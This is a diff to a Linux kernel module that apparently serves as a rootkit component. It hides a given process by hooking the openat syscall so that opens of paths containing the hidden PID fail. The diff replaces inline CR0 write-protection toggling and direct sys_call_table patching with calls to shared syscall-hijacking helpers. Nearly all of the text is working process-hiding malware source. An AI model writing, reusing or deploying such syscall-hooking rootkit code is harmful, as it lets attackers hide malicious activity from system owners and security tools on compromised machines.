@@ -7,6 +7,7 @@
 #include <linux/file.h>
 #include <linux/limits.h>
 #include <stdbool.h>
+#include "../common/syscall_hijacking/syscall_hijack.h"
 
 // Function prototypes
 void initialize_path_to_hide(void);
@@ -15,34 +16,19 @@ void initialize_path_to_hide(void);
 static char *pid_to_hide = NULL;
 module_param(pid_to_hide, charp, 0600);
 
+static char *path_to_hide;
+
 typedef int (*original_openat_t)(const struct pt_regs *regs);
 static original_openat_t original_openat_ptr;
-static unsigned long *syscall_table; 
-static char *path_to_hide;
- 
-static inline void wp_cr0(unsigned long val) {
-    __asm__ __volatile__ ("mov %0, %%cr0": "+r" (val));
-}
-
-static inline void zero_cr0(void) {
-    printk(KERN_ALERT "Unprotecting mem!");
-    wp_cr0(read_cr0() & (~0x10000));
-}
-
-static inline void one_cr0(void) {
-    printk(KERN_ALERT "Protecting mem...");
-    wp_cr0(read_cr0() | 0x10000);
-}
 
 int new_openat(const struct pt_regs *regs) {
-    void *path_name_pointer = (void*)regs->si;
+    void *path_name_ptr = (void*)regs->si;
     char *path;
     path = kmalloc(PATH_MAX, GFP_KERNEL);
-    copy_from_user((void*)path, path_name_pointer, PATH_MAX);
+    copy_from_user((void*)path, path_name_ptr, PATH_MAX);
 
     // Incase pid to hide has been changed.
     initialize_path_to_hide();
-
 
     // If the target is contained within/is the path we're trying to hide, return an error.
     if (strstr(path, path_to_hide) != NULL) {
@@ -60,21 +46,21 @@ void initialize_path_to_hide(void) {
 }
 
 int load(void) {
+    printk(KERN_ALERT "Initializing...");
     if (pid_to_hide == NULL) {
         printk(KERN_ALERT "Pid to hide has not been set! Exiting...");
         return -1;
     }
 
-    printk(KERN_ALERT "Initializing...");
     path_to_hide = kmalloc(PATH_MAX, GFP_KERNEL);
     initialize_path_to_hide();
 
-    zero_cr0();
-    syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
-    original_openat_ptr = (original_openat_t)syscall_table[__NR_openat];
-    syscall_table[__NR_openat] = (unsigned long)new_openat;
-    printk(KERN_ALERT "Overrided openat ptr!");
-    one_cr0();
+    unsigned long openat_ptr = hijack_syscall(__NR_openat, (unsigned long)new_openat);
+    if (!openat_ptr) {
+        return -1;
+    }
+
+    original_openat_ptr = (original_openat_t)openat_ptr;
     printk(KERN_ALERT "Initialized successfuly!");
 
     return 0;
@@ -82,11 +68,7 @@ int load(void) {
  
 void unload(void) {
     printk(KERN_ALERT "Shutting down.");
-    zero_cr0();
-    syscall_table[__NR_openat] = (unsigned long)original_openat_ptr;  
-    printk(KERN_ALERT "openat has been restored!");
-    one_cr0();
-
+    restore_syscall(__NR_openat, (unsigned long)original_openat_ptr);
     kfree(path_to_hide);
     printk(KERN_ALERT "Goodbye world...");
 }
